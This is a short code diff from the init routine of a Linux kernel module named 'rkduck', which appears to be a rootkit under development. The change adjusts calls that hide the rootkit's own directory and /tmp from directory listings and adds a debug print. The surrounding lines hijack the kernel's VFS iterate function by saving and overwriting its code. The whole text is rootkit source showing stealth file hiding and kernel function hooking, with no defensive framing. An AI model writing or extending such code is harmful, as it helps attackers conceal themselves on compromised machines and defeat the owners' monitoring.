@@ -17,9 +17,10 @@ int duck_init(void) {
     // set_page_ro((ptr_t) sys_call_table);
 
     vfs_hide_file("/root/rkduck/rkduck/rkduck_dir");
-    vfs_hide_file("/root/rkduck/rkduck/coucou");
-    vfs_hide_file(str_remove_duplicates("/tmp"));
-
+    vfs_hide_file(str_remove_duplicates("///tmp////"));
+    // vfs_hide_file(str_remove_duplicates("/tmp"));
+    printk("rkduck: %s\n", str_remove_duplicates("///tmp////"));
+    
     vfs_original_iterate = vfs_get_iterate("/");
     vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
     vfs_hijack_start(vfs_original_iterate);
